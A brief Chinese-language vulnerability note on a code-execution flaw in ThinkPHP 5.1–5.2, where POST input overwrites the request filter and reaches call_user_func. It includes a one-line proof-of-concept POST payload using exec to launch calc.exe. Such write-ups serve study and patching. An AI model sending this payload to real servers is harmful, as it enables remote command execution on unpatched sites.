# Thinkphp5.1-5.2全版本代码执行

在Request.php的method中将this-filter复制为post传入的内容。导致后续利用Thinkphp5.1.x反序列化中学习到的$value = call_user_func($filter, $value);执行命令！

## poc

```php
c=exec&f=calc.exe&&_method=filter
```

这里属性c以及f随意赋值即可！都会作为filgter去赋值。